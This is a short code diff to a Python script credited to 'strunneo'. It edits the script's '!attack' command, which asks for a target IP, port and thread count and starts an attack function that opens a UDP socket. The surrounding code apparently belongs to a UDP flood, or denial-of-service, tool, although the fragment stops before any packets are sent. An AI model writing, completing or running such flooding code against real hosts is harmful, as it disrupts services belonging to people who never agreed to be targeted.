@@ -59,11 +59,11 @@ while True:
         print("Made By strunneo")
         print(welcome)
 
-    elif eraser == ".attack":
-        ip = input("Target IP 🦧: ")
-        port = input("Port: ")
-        threads = input("Amount Of Threads: ")\
-        
+    elif eraser == "!attack" or eraser == "!ATTACK" or eraser == "!Attack":
+        ip = input("Target IP: ")
+        port = int(input("Target Port: "))
+        threads = int(input("Amount Of Threads: "))
+
         def attack():
             attack = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
